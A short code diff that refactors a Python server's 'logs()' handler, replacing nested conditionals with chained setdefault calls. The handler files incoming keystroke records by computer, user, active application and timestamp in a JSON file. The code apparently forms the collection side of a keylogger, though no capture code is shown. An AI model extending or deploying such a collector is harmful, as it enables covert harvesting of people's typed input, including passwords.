@@ -27,16 +27,9 @@ def logs():
         keys = data_dict['keys']
         timestamp = data_dict['timestamp']
         
-        if computer_name in json_data.keys():
-            if user_name in json_data[computer_name].keys():
-                if active_app in json_data[computer_name][user_name].keys():
-                    json_data[computer_name][user_name][active_app][timestamp] = keys
-                else:
-                    json_data[computer_name][user_name][active_app] = {timestamp: keys}
-            else:
-                json_data[computer_name][user_name] = {active_app: {timestamp: keys}}
-        else:
-            json_data[computer_name] = {user_name: {active_app: {timestamp: keys}}}
+        json_data.setdefault(computer_name, {}) \
+                 .setdefault(user_name, {}) \
+                 .setdefault(active_app, {})[timestamp] = keys
 
         with open('server/static/json/data.json', 'w') as file:
             json.dump(json_data, file, indent=4)
